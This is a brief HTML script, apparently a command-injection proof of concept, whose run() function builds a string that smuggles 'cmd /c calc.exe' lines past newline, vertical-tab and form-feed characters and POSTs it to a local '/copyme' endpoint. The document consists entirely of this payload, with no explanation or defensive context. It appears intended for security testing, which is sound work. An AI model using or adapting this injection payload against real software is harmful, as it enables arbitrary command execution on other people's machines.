<script>
function run() {
  const payload =
    "A\ncmd /c calc.exe" +
    String.fromCharCode(0x0b) +
    "\ncmd /c calc.exe" +
    String.fromCharCode(0x0c);

  fetch("/copyme", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: payload
  });
}
</script>
